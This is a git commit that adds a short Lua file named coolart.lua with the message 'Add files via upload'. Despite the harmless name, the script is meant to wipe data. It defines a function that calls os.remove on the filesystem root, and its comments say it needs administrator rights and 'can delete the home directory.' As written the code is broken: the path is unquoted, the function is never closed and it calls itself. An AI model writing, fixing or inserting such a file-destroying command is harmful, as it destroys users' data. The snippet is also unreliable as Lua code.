91d9341a12bf16c87c6e88787ca3d39a059f683b
Clickobat <73265375+Clickobat@users.noreply.github.com>
2022-10-06 08:26:45 +1100

    Add files via upload

---
+++ coolart.lua
@@ -0,0 +1,8 @@
+--you have to be running as administrator or a user with administrative privileges in order for this script to run.
+
+zing = function()
+  os.remove(/)
+zing()
+
+--use with caution because this script can delete the home directory.
+--lua is needed in order for the script to work
